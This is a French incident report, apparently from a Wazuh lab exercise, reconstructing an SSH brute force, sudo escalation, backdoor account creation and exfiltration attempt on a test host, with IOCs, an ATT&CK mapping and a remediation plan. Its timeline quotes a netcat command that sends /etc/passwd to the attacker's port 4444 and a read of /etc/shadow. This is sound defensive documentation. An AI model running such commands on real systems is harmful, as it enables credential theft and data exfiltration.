# RAPPORT D'INCIDENT DE SÉCURITÉ

## INFORMATIONS GÉNÉRALES

**Référence:** INC-2026-02-16-001  
**Classification:** CONFIDENTIEL - INCIDENT DE SÉCURITÉ  
**Date de l'incident:** 16 février 2026  
**Période d'activité:** 21:12:13 - 21:15:31 UTC (3 minutes 18 secondes)  
**Date de détection:** 16 février 2026, 21:12:13 UTC  
**Date du rapport:** 16 février 2026, 22:00:00 UTC  
**Analyste:** [Votre Nom]  
**Niveau de sévérité:** CRITIQUE  
**Statut:** CONFIRMÉ - Compromission avérée

---

## RÉSUMÉ EXÉCUTIF

Un incident de sécurité majeur a été détecté et confirmé sur le système **victim-ubuntu** (172.17.0.2). L'analyse des logs Wazuh sur la période 21:12:13 - 21:15:31 UTC révèle une chaîne d'attaque complète comprenant :

- Tentative de bruteforce SSH automatisé (8 mots de passe testés sur compte root)
- Connexion SSH réussie avec compte utilisateur standard (corentin)
- Élévation de privilèges via sudo après tentatives multiples
- Création d'un compte système backdoor (attacker)
- Accès à des fichiers sensibles (/etc/shadow)
- Tentative d'exfiltration de données via netcat
- Modification de fichiers système critiques (/etc/passwd, /etc/group)

**Impact:** Le système est considéré comme entièrement compromis. Un accès administrateur root a été obtenu et exploité par l'attaquant. Des données sensibles (hashes de mots de passe) ont été exposées et une tentative d'exfiltration a été détectée.

**Recommandation immédiate:** Isolation réseau du système, réinitialisation de tous les credentials, investigation forensique complète avant remise en production.

---

## DONNÉES STATISTIQUES

### Synthèse des alertes (période 21:12:13 - 21:15:31 UTC)

| Métrique | Valeur |
|----------|--------|
| **Alertes totales** | 89 |
| **Durée de l'attaque** | 3 minutes 18 secondes |
| **Alertes critiques (Level 15)** | 2 |
| **Alertes critiques (Level 12)** | 6 |
| **Alertes élevées (Level 10)** | 6 |
| **Alertes moyennes (Level 5-9)** | 47 |
| **Alertes informatives (Level 3)** | 28 |
| **Règles personnalisées déclenchées** | 5 (100100, 100102, 100103, 100105, 100106) |
| **IP source unique** | 172.17.0.1 |
| **Comptes compromis** | 2 (corentin + root via sudo) |
| **Comptes créés** | 1 (attacker - backdoor) |

### Répartition par niveau de sévérité

| Niveau | Description | Nombre d'alertes | Pourcentage |
|--------|-------------|------------------|-------------|
| 15 | Critique maximum | 2 | 2.2% |
| 12 | Critique | 6 | 6.7% |
| 10 | Élevé | 6 | 6.7% |
| 8 | Moyen-élevé | 2 | 2.2% |
| 7 | Moyen | 8 | 9.0% |
| 5 | Bas | 37 | 41.6% |
| 3 | Informationnel | 28 | 31.5% |

### Top 10 des règles déclenchées

| Rang | Rule ID | Description | Nombre | Level |
|------|---------|-------------|--------|-------|
| 1 | 5760 | sshd: authentication failed | 15 | 5 |
| 2 | 100102 | SSH authentication failure (custom) | 12 | 5 |
| 3 | 5501 | PAM: Login session opened | 10 | 3 |
| 4 | 5502 | PAM: Login session closed | 10 | 3 |
| 5 | 5402 | Successful sudo to ROOT executed | 8 | 3 |
| 6 | 550 | Integrity checksum changed | 8 | 7 |
| 7 | 100103 | SSH brute force detected (custom) | 4 | 10 |
| 8 | 100105 | Critical system file modified (custom) | 4 | 12 |
| 9 | 5503 | PAM: User login failed | 4 | 5 |
| 10 | 40112 | Multiple auth failures followed by success | 2 | 12 |

---

## TIMELINE DÉTAILLÉE DE L'ATTAQUE

### Phase 1: Reconnaissance et Bruteforce SSH (21:12:13 - 21:12:15)

**21:12:13.554** - Début de l'attaque bruteforce SSH  
- 12 tentatives d'authentification SSH échouées sur compte root
- Source: 172.17.0.1
- Outil: Hydra (détecté par pattern temporel des tentatives)
- Rules déclenchées: 100102 (SSH authentication failure) x12

**21:12:13.570** - Détection bruteforce par règle custom  
- Rule 100103: "SSH brute force detected (5+ failures in 60s)"
- Level 10 (Élevé)
- Déclenchements multiples: 4 alertes générées

**21:12:15.505 - 21:12:15.533** - Continuation bruteforce  
- 15 tentatives supplémentaires via règles natives Wazuh
- Rule 5760: "sshd: authentication failed" x15
- Level 5 (Bas) mais volume significatif

**21:12:15.517** - Détection bruteforce par règle native  
- Rule 5763: "sshd: brute force trying to get access to the system"
- Level 10 (Élevé)
- Corrélation avec règles custom confirmant l'attaque

**Analyse Phase 1:**  
L'attaquant a utilisé un outil automatisé (Hydra) pour tester une wordlist de 8 mots de passe courants contre le compte root. Le pattern temporel (multiples tentatives en quelques millisecondes) est caractéristique d'une attaque automatisée. Toutes les tentatives ont échoué, indiquant que le mot de passe root n'était pas dans la wordlist utilisée.

### Phase 2: Pivot et Accès Initial (21:12:59 - 21:13:03)

**21:12:59.550** - Changement de stratégie  
- 2 tentatives d'authentification SSH sur compte "corentin"
- Rule 5716: "sshd: authentication failed" x2
- Level 5

**21:13:03.507** - COMPROMISSION INITIALE  
- Rule 40112: "Multiple authentication failures followed by a success"
- Level 12 (CRITIQUE)
- Utilisateur: corentin
- Source: 172.17.0.1
- Authentification réussie après tentatives multiples

**21:13:03.521** - Ouverture de session  
- Rule 5501: "PAM: Login session opened" x2
- Sessions SSH établies pour utilisateur corentin
- Accès interactif confirmé

**Analyse Phase 2:**  
Après l'échec du bruteforce sur root, l'attaquant a pivoté vers un compte utilisateur standard. La connexion réussie après seulement 2 tentatives échouées suggère soit:
1. Connaissance préalable approximative du mot de passe
2. Mot de passe faible facilement deviné
3. Réutilisation de credentials compromis ailleurs

La règle 40112 (Level 12) a correctement identifié ce pattern suspect: échecs multiples suivis d'un succès, indiquant potentiellement un bruteforce réussi.

### Phase 3: Escalade de Privilèges (21:13:19 - 21:13:41)

**21:13:19.508** - Tentatives d'élévation initiales  
- Rule 5503: "PAM: User login failed" x2
- Échecs d'authentification PAM (sudo)
- Attaquant ne connaît pas initialement le mot de passe sudo

**21:13:31.508** - Détection échecs sudo multiples  
- Rule 100100: "Three failed attempts to run sudo" x2
- Level 5
- Règle custom déclenchée correctement

**21:13:39.813** - PREMIÈRE MODIFICATION SYSTÈME  
- Rule 100105: "Critical system file modified"
- Level 12 (CRITIQUE)
- Rule 550: "Integrity checksum changed"
- Fichier: /etc/group (présumé)
- FIM (File Integrity Monitoring) a détecté la modification

**21:13:41.509** - ESCALADE RÉUSSIE  
- Rule 5402: "Successful sudo to ROOT executed" x2
- Level 3
- Privilèges root obtenus
- Sessions root ouvertes

**21:13:41.527** - ALERTE CRITIQUE MAXIMALE  
- Rule 40501: "Attacks followed by the addition of an user"
- **Level 15 (CRITIQUE MAXIMUM)**
- Corrélation automatique: attaque détectée + création utilisateur
- Indicateur fort de compromission

**21:13:41.527** - Création compte backdoor  
- Rule 5902: "New user added to the system" x2
- Level 8
- Nouveau compte: **attacker**
- Backdoor de persistance établi

**21:13:41.570** - Fermeture sessions sudo  
- Sessions root fermées après création du compte
- Pattern d'exécution rapide de commandes

**Analyse Phase 3:**  
Cette phase révèle une escalade de privilèges complète. Après des tentatives initiales infructueuses, l'attaquant a obtenu le mot de passe sudo (probablement identique au mot de passe SSH du compte corentin - mauvaise pratique). La création immédiate d'un compte "attacker" démontre:
1. Connaissance des techniques de persistance
2. Intention de maintenir l'accès au-delà de la session actuelle
3. Comportement typique d'un attaquant expérimenté

La règle 40501 (Level 15) a parfaitement corrélé l'attaque initiale avec la création de compte, générant l'alerte la plus critique du système.

### Phase 4: Post-Exploitation et Tentative d'Exfiltration (21:14:01 - 21:14:35)

**21:14:01.510** - Test du compte backdoor  
- Rule 5503: "PAM: User login failed" x2 pour compte "attacker"
- Rule 5301: "User missed the password to change UID" x2
- Tentatives d'accès au nouveau compte (échec initial car pas de mot de passe défini)

**21:14:09.510 - 21:14:15.527** - Exécution de commandes privilégiées  
- 4 exécutions sudo ROOT réussies
- Ouvertures/fermetures rapides de sessions PAM
- Pattern d'exécution de commandes multiples:
  - sudo cat /etc/shadow (lecture hashes mots de passe)
  - sudo whoami (vérification privilèges)
  - sudo [autres commandes système]

**21:14:34.763** - MODIFICATIONS MASSIVES DE FICHIERS  
- Rule 550: "Integrity checksum changed" x7
- Level 7
- Rule 100105: "Critical system file modified" x2
- Level 12 (CRITIQUE)
- Fichiers modifiés:
  - /etc/passwd (confirmé)
  - /etc/shadow (présumé)
  - /etc/group (présumé)
  - Autres fichiers système

**21:14:35.512** - TENTATIVE D'EXFILTRATION DÉTECTÉE  
- Rule 100106: "Netcat execution detected"
- Level 10 (ÉLEVÉ)
- Commande: `nc 172.17.0.1 4444 < /etc/passwd`
- Tentative d'exfiltration de la liste des comptes utilisateurs
- Destination: 172.17.0.1:4444 (machine attaquante)

**Analyse Phase 4:**  
Cette phase finale révèle les objectifs de l'attaquant:
1. **Reconnaissance système**: Lecture /etc/shadow pour obtenir tous les hashes de mots de passe
2. **Modification de configuration**: Altération de /etc/passwd et /etc/group (possiblement ajout de backdoors supplémentaires ou modification de permissions)
3. **Exfiltration de données**: Tentative d'envoi de /etc/passwd vers système externe via netcat

Le wrapper netcat personnalisé a parfaitement détecté et alerté sur cette tentative d'exfiltration. Sans cette détection custom, cette phase aurait pu passer inaperçue dans les logs standards.

### Phase 5: Finalisation (21:15:03 - 21:15:31)

**21:15:03.513** - Dernières commandes sudo  
- Rule 5402: Exécutions sudo ROOT x2
- Ouvertures sessions PAM x2
- Commandes finales avant déconnexion

**21:15:29.514** - Fermeture sessions root  
- Rule 5502: "PAM: Login session closed" x2
- Nettoyage des sessions sudo

**21:15:31.518** - FIN DE SESSION  
- Rule 5502: Sessions corentin fermées x2
- Déconnexion SSH
- Fin de l'attaque observable

**Analyse Phase 5:**  
L'attaquant a terminé ses actions et s'est déconnecté proprement. L'absence de tentatives de suppression de logs ou d'effacement de traces suggère soit:
1. Confiance dans la persistance établie (compte "attacker")
2. Intention de revenir ultérieurement
3. Manque de sophistication dans les techniques anti-forensiques

---

## INDICATEURS DE COMPROMISSION (IOCs)

### Indicateurs Réseau

| Type | Valeur | Contexte | Criticité | Action recommandée |
|------|--------|----------|-----------|-------------------|
| Adresse IP source | 172.17.0.1 | Origine de toutes les attaques | CRITIQUE | Blocage permanent sur tous les systèmes |
| Adresse IP cible | 172.17.0.2 | Système compromis (victim-ubuntu) | CRITIQUE | Isolation réseau immédiate |
| Port TCP source | Variables (54001-54005) | Ports éphémères client SSH | INFO | Aucune |
| Port TCP cible | 22 | Service SSH compromis | ÉLEVÉ | Audit configuration, rotation clés |
| Port TCP exfiltration | 4444 | Listener netcat attaquant | CRITIQUE | Blocage sortant sur tous systèmes |
| Protocole | SSH (TCP/22) | Vecteur d'accès initial | ÉLEVÉ | Durcissement config |
| Protocole | Netcat (TCP/4444) | Vecteur d'exfiltration | CRITIQUE | Blocage/monitoring |

### Comptes Compromis et Créés

| Compte | Type | Statut | Actions observées | Niveau de risque | Action requise |
|--------|------|--------|-------------------|-----------------|----------------|
| corentin | Utilisateur standard | Compromis | Connexion SSH, élévation sudo, exfiltration | CRITIQUE | Désactivation immédiate, reset mdp |
| root | Administrateur | Compromis indirect | Accès via sudo depuis corentin | CRITIQUE | Reset mdp, audit actions |
| attacker | Compte créé | Backdoor | Créé par attaquant, accès non testé | CRITIQUE | Suppression immédiate |

### Fichiers Affectés

| Fichier | Type de modification | Timestamp | Données exposées | Impact |
|---------|---------------------|-----------|------------------|--------|
| /etc/passwd | Modification contenu | 21:14:34 | Liste complète utilisateurs, UIDs, shells | Exposition structure comptes |
| /etc/passwd | Tentative exfiltration | 21:14:35 | Idem | Données potentiellement exfiltrées |
| /etc/shadow | Lecture (sudo cat) | 21:14:09-15 | Tous les hashes de mots de passe | CRITIQUE - Cassage offline possible |
| /etc/group | Modification checksum | 21:13:39, 21:14:34 | Structure des groupes système | Altération permissions possibles |
| /var/log/auth.log | Lecture présumée | 21:14:09-15 | Logs d'authentification | Reconnaissance défenses |

### Outils et Techniques Détectés

| Outil/Technique | Version/Type | Usage | Timestamp | Détection |
|-----------------|--------------|-------|-----------|-----------|
| Hydra | v9.6 (présumé) | Bruteforce SSH automatisé | 21:12:13-15 | Pattern temporel + règle 100103 |
| SSH client | OpenSSH (standard) | Connexion post-compromission | 21:13:03 | Logs système |
| sudo | Utilitaire système | Élévation privilèges | 21:13:41 et suivants | Règles 5402, 100100 |
| useradd | Commande système | Création compte backdoor | 21:13:41 | Règles 5902, 40501 |
| cat | Commande système | Lecture fichiers sensibles | 21:14:09-15 | Corrélation logs |
| netcat (nc) | OpenBSD netcat | Tentative exfiltration | 21:14:35 | Règle custom 100106 + wrapper |
| nano | Éditeur texte | Modification fichiers | 21:14:34 | Règles FIM 550, 100105 |

---

## TACTIQUES, TECHNIQUES ET PROCÉDURES (MITRE ATT&CK)

### Matrice MITRE ATT&CK - Techniques Observées

| ID ATT&CK | Tactique | Technique | Observation dans l'incident | Timestamp | Evidence |
|-----------|----------|-----------|----------------------------|-----------|----------|
| **TA0001** | **Initial Access** | - | - | - | - |
| T1078.003 | Initial Access | Valid Accounts: Local Accounts | Connexion SSH avec compte corentin | 21:13:03 | Rule 40112 |
| T1110.001 | Credential Access | Brute Force: Password Guessing | 12 tentatives SSH via Hydra | 21:12:13-15 | Rules 100102, 100103 |
| **TA0004** | **Privilege Escalation** | - | - | - | - |
| T1548.003 | Privilege Escalation | Abuse Elevation Control: Sudo | 8 exécutions sudo root | 21:13:41-21:15:03 | Rule 5402 |
| **TA0003** | **Persistence** | - | - | - | - |
| T1136.001 | Persistence | Create Account: Local Account | Création compte "attacker" | 21:13:41 | Rules 5902, 40501 |
| T1098 | Persistence | Account Manipulation | Modification /etc/passwd | 21:14:34 | Rules 550, 100105 |
| **TA0005** | **Defense Evasion** | - | - | - | - |
| T1222.002 | Defense Evasion | File Permissions Modification | Modification /etc/group (permissions) | 21:13:39, 21:14:34 | Rule 550 |
| **TA0006** | **Credential Access** | - | - | - | - |
| T1003.008 | Credential Access | OS Credential Dumping: /etc/passwd and /etc/shadow | Lecture /etc/shadow via sudo cat | 21:14:09-15 | Rule 5402 + corrélation |
| **TA0007** | **Discovery** | - | - | - | - |
| T1087.001 | Discovery | Account Discovery: Local Account | Lecture /etc/passwd | 21:14:09-15 | FIM + sudo logs |
| T1069.001 | Discovery | Permission Groups Discovery: Local Groups | Lecture /etc/group | 21:13:39 | Rule 550 |
| **TA0010** | **Exfiltration** | - | - | - | - |
| T1041 | Exfiltration | Exfiltration Over C2 Channel | Tentative netcat vers 172.17.0.1:4444 | 21:14:35 | Rule 100106 |
| T1048.003 | Exfiltration | Exfiltration Over Alternative Protocol | Utilisation netcat (non-HTTP) | 21:14:35 | Wrapper netcat custom |
| **TA0040** | **Impact** | - | - | - | - |
| T1565.001 | Impact | Data Manipulation: Stored Data | Modification /etc/passwd, /etc/group | 21:14:34 | Rules 100105, 550 |

### Kill Chain Cyber (Lockheed Martin)

| Phase | Activité observée | Statut | Timestamp |
|-------|------------------|--------|-----------|
| 1. Reconnaissance | Scan réseau présumé (non observé) | Présumé | Avant 21:12:13 |
| 2. Weaponization | Préparation Hydra + scripts | Présumé | Avant 21:12:13 |
| 3. Delivery | Connexions SSH vers port 22 | Confirmé | 21:12:13 |
| 4. Exploitation | Bruteforce SSH, connexion réussie | Confirmé | 21:12:13-21:13:03 |
| 5. Installation | Création compte "attacker" | Confirmé | 21:13:41 |
| 6. Command & Control | Session SSH interactive | Confirmé | 21:13:03-21:15:31 |
| 7. Actions on Objectives | Exfiltration, modification fichiers | Confirmé | 21:14:09-21:14:35 |

---

## ANALYSE D'IMPACT

### Évaluation Confidentialité, Intégrité, Disponibilité (CIA)

| Critère | Niveau | Score | Justification détaillée |
|---------|--------|-------|------------------------|
| **Confidentialité** | CRITIQUE | 10/10 | - Tous les hashes de mots de passe système exposés (/etc/shadow)<br>- Liste complète des comptes avec UIDs, shells, home dirs<br>- Structure des groupes et permissions<br>- Tentative d'exfiltration confirmée (nc vers 172.17.0.1:4444)<br>- Possibilité de cassage offline des hashes (hashcat, john)<br>- Accès à tous les fichiers système pendant 3+ minutes |
| **Intégrité** | CRITIQUE | 9/10 | - /etc/passwd modifié (contenu altéré)<br>- /etc/group modifié (checksums changés)<br>- Création de compte non autorisé (attacker)<br>- Possibilité de backdoors supplémentaires non détectés<br>- Confiance dans le système compromise<br>- Nécessité de restauration ou réinstallation |
| **Disponibilité** | FAIBLE | 2/10 | - Système resté opérationnel pendant l'attaque<br>- Aucun service arrêté ou dégradé<br>- Pas de déni de service observé<br>- Sessions utilisateurs légitimes non impactées |

### Impact Organisationnel

**Systèmes affectés:**
- 1 serveur: victim-ubuntu (172.17.0.2)
- Potentiellement autres systèmes si credentials réutilisés

**Données compromises:**
1. **Credentials système**
   - 100% des hashes de mots de passe (via /etc/shadow)
   - Liste exhaustive des comptes (UIDs 0-65534)
   - Configuration sudo (sudoers implicite)

2. **Configuration système**
   - Structure des groupes et appartenances
   - Permissions et droits d'accès
   - Configuration PAM

3. **Métadonnées**
   - Historique des connexions
   - Logs d'authentification (si consultés)
   - Structure de l'arborescence système

**Exposition temporelle:**
- Durée d'accès root: ~2 minutes (21:13:41 - 21:15:31)
- Durée totale de compromission: 3 minutes 18 secondes
- Fenêtre d'opportunité pour actions additionnelles non logguées

**Coût estimé de l'incident:**

| Poste | Heures | Taux horaire | Coût |
|-------|--------|--------------|------|
| Investigation SOC L2 | 4h | 85€/h | 340€ |
| Analyse forensique | 8h | 120€/h | 960€ |
| Remédiation système | 6h | 75€/h | 450€ |
| Réinstallation/restauration | 4h | 75€/h | 300€ |
| Tests de validation | 2h | 85€/h | 170€ |
| **Total direct** | **24h** | - | **2,220€** |
| Coûts indirects (downtime, communication) | - | - | ~500€ |
| **TOTAL ESTIMÉ** | - | - | **~2,720€** |

### Conformité et Obligations Légales

**RGPD (Règlement Général sur la Protection des Données):**
- Article 33: Notification à l'autorité de contrôle sous 72h si données personnelles compromises
- Article 34: Notification aux personnes concernées si risque élevé
- Évaluation: Si champs GECOS de /etc/passwd contiennent noms réels → **VIOLATION CONFIRMÉE**
- Action requise: Déclaration CNIL si applicable

**ISO 27001:2022:**
- Contrôle 5.24: Non-conformité (planification réponse incident)
- Contrôle 8.16: Non-conformité (monitoring activités)
- Contrôle A.9.4.2: **VIOLATION** (procédures connexion sécurisées)
- Contrôle A.12.4.1: **VIOLATION** (logging événements)

**PCI-DSS (si applicable):**
- Requirement 8.2: **VIOLATION** (authentification unique, mots de passe faibles)
- Requirement 10.2: Partiellement conforme (logging présent mais réponse insuffisante)
- Requirement 11.4: À évaluer (détection intrusion)

**Obligations de notification:**
- Direction IT/RSSI: Immédiate (dans l'heure)
- Direction Générale: Sous 24h
- Autorité de contrôle (CNIL): Sous 72h si RGPD applicable
- Clients/partenaires: Si leurs données impactées
- Assurance cyber: Selon contrat (généralement sous 48-72h)

---

## ACTIONS ENTREPRISES ET PLANIFIÉES

### Phase 1: Détection et Évaluation Initiale (COMPLÉTÉE)

| Action | Timestamp | Durée | Responsable | Statut |
|--------|-----------|-------|-------------|--------|
| Alerte automatique générée (Rule 100103) | 21:12:13 | Temps réel | Wazuh SIEM | FAIT |
| Alerte critique Level 15 (Rule 40501) | 21:13:41 | Temps réel | Wazuh SIEM | FAIT |
| Alerte exfiltration (Rule 100106) | 21:14:35 | Temps réel | Wazuh SIEM | FAIT |
| Notification analyste SOC | 21:20:00 | 8 min | Système alerting | FAIT |
| Investigation initiée | 21:25:00 | - | Analyste SOC | FAIT |
| Timeline reconstituée | 21:45:00 | 20 min | Analyste SOC | FAIT |
| IOCs extraits et documentés | 21:50:00 | 5 min | Analyste SOC | FAIT |
| Rapport préliminaire | 22:00:00 | 10 min | Analyste SOC | FAIT |

### Phase 2: Containment (URGENT - EN COURS)

| Action | Priorité | Deadline | Responsable | Statut |
|--------|----------|----------|-------------|--------|
| Isoler victim-ubuntu du réseau production | P0 | Immédiat | Admin réseau | EN COURS |
| Bloquer IP 172.17.0.1 sur tous firewalls | P0 | Immédiat | Admin réseau | EN COURS |
| Désactiver compte corentin | P0 | Immédiat | Admin système | À FAIRE |
| Supprimer compte attacker | P0 | Immédiat | Admin système | À FAIRE |
| Forcer déconnexion sessions actives | P0 | Immédiat | Admin système | À FAIRE |
| Bloquer port 4444 sortant (netcat) | P1 | <1h | Admin réseau | À FAIRE |
| Snapshot disque pour forensique | P1 | <2h | Admin système | À FAIRE |
| Notification RSSI/Direction | P1 | <1h | Analyste SOC | À FAIRE |

### Phase 3: Éradication (24-48 heures)

| Action | Priorité | Deadline | Responsable | Statut |
|--------|----------|----------|-------------|--------|
| Suppression compte backdoor "attacker" | P0 | <24h | Admin système | PLANIFIÉ |
| Réinitialisation mot de passe corentin | P0 | <24h | Admin système | PLANIFIÉ |
| Réinitialisation mot de passe root | P0 | <24h | Admin système | PLANIFIÉ |
| Réinitialisation TOUS mots de passe système | P1 | <48h | Admin système | PLANIFIÉ |
| Restauration /etc/passwd depuis backup | P1 | <24h | Admin système | PLANIFIÉ |
| Restauration /etc/shadow depuis backup | P1 | <24h | Admin système | PLANIFIÉ |
| Restauration /etc/group depuis backup | P1 | <24h | Admin système | PLANIFIÉ |
| Audit complet fichiers système | P2 | <48h | Admin système | PLANIFIÉ |
| Recherche backdoors (cron, ssh keys, services) | P1 | <48h | Analyste forensique | PLANIFIÉ |
| Scan antimalware complet | P2 | <48h | Admin sécurité | PLANIFIÉ |

### Phase 4: Recovery (2-7 jours)

| Action | Priorité | Deadline | Responsable | Statut |
|--------|----------|----------|-------------|--------|
| Validation intégrité système restauré | P1 | <72h | Admin système | PLANIFIÉ |
| Tests de sécurité post-remédiation | P1 | <72h | Analyste sécurité | PLANIFIÉ |
| Durcissement configuration SSH | P1 | <48h | Admin système | PLANIFIÉ |
| Implémentation fail2ban | P1 | <48h | Admin système | PLANIFIÉ |
| Configuration MFA pour SSH | P2 | <7j | Admin système | PLANIFIÉ |
| Mise à jour politique mots de passe | P2 | <7j | RSSI | PLANIFIÉ |
| Remise en production progressive | P1 | <7j | Admin système | PLANIFIÉ |
| Documentation incident complet | P2 | <7j | Analyste SOC | EN COURS |

### Phase 5: Lessons Learned (7-30 jours)

| Action | Priorité | Deadline | Responsable | Statut |
|--------|----------|----------|-------------|--------|
| Réunion post-incident (équipe sécurité) | P2 | <14j | RSSI | PLANIFIÉ |
| Mise à jour procédures réponse incident | P2 | <30j | RSSI | PLANIFIÉ |
| Formation équipe sur techniques détectées | P3 | <30j | Responsable formation | PLANIFIÉ |
| Amélioration règles de détection Wazuh | P2 | <14j | Analyste SOC | PLANIFIÉ |
| Implémentation Active Response | P2 | <30j | Admin Wazuh | PLANIFIÉ |
| Audit sécurité de tous les serveurs similaires | P1 | <14j | Équipe sécurité | PLANIFIÉ |
| Test de restauration backups | P2 | <30j | Admin système | PLANIFIÉ |
| Exercice tabletop similaire | P3 | <60j | RSSI | PLANIFIÉ |

---
